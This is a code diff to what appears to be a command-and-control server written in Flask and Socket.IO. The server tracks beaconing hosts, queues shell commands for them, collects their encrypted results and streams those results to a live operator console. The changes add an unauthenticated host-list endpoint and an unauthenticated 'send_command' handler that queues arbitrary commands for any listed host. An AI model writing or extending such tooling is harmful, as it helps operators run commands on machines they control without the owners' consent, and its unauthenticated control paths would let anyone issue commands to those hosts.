@@ -90,12 +90,18 @@ def add_task():
 @app.route('/console')
 @login_required
 def console():
+    return render_template("console.html")
+
+
+@app.route('/console_data')
+def console_data():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("SELECT DISTINCT hostname FROM beacons ORDER BY hostname")
     hosts = [row[0] for row in c.fetchall()]
     conn.close()
-    return render_template("console.html", hosts=hosts)
+    return jsonify({"hosts": hosts})
+
 
 @app.route('/console_send', methods=['POST'])
 @login_required
@@ -162,10 +168,23 @@ def result():
 
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", (result, hostname, command))
+    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", 
+              (result, hostname, command))
     conn.commit()
     conn.close()
+
+    print(f"[+] Result from {hostname}:\n{result}")
+
+    # ✅ Emit to the live console before the return
+    socketio.emit("console_result", {
+        "hostname": hostname,
+        "command": command,
+        "result": result
+    })
+
     return jsonify({"status": "result stored"})
+
+
 
 @socketio.on('connect')
 def handle_connect():
@@ -195,12 +214,29 @@ def handle_result(encrypted_data):
 
     emit("ack", aes_encrypt(json.dumps({"msg": "Result stored"})))
 
-    # Emit to live console
+    # ✅ Add this line so the live console sees it
     socketio.emit("console_result", {
         "hostname": hostname,
         "command": command,
         "result": result
     })
+
+
+@socketio.on('send_command')
+def handle_send_command(data):
+    hostname = data.get("hostname")
+    command = data.get("command")
+    if not hostname or not command:
+        return
+
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
+    conn.commit()
+    conn.close()
+
+    print(f"[+] Queued task for {hostname}: {command}")
+
 
 @socketio.on('request_task')
 def handle_task_request(encrypted_data):
